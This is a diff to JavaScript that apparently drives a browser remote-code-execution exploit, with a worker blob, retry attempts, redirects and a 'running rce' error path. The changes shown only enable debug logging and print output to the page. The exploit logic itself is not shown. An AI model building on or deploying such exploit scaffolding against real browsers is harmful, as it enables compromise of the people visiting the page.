@@ -17,6 +17,9 @@ function print(x, reportError = false, dumphex = false) {
         obj.hex = 1
         obj.text = x
     }
+    const newLineElement = document.createElement('p');
+    newLineElement.textContent = obj.text;
+    document.body.append(newLineElement);
     //let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
     //const xhr = new XMLHttpRequest();
     //xhr.open("GET", "/log.html?" + req , false);
@@ -31,7 +34,7 @@ function getJS(fname,method = 'GET')
     try 
     {
         url = fname;
-        //(`trying to fetch ${method} from: ${url}`);
+        print(`trying to fetch ${method} from: ${url}`);
         let xhr = new XMLHttpRequest();
         xhr.open("GET", `${url}` , false);
         xhr.send(null);
@@ -39,7 +42,7 @@ function getJS(fname,method = 'GET')
     }
     catch(e)
     {
-       // print("got error in getJS: " + e);
+       print("got error in getJS: " + e);
     }
 }
 const signal = new Uint8Array(8);
@@ -110,6 +113,11 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         async function message_handler(e) {
         const data = e.data;
         switch (data.type) {
+            case 'log':
+            {
+                print(data.text);
+                break;
+            }
             case 'redirect':
             {
                 doRedirect();
@@ -179,7 +187,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         }
         catch(e)
         {
-            //print("Got exception while running rce: " + e);
+            print("Got exception while running rce: " + e);
         }
         let desiredHost = "";
         desiredHost = location.origin;
@@ -198,7 +206,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         attempt.start().then((result) => {
             if(!result)
             {
-               // print("Retrying");
+               print("Retrying");
                 attempt.start().then((result) => {
                     if(!result)
                        print("");
@@ -240,7 +248,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         }
         catch(e)
         {
-       // print("Got exception on something: " + e);
+       print("Got exception on something: " + e);
         }
     }
     main();
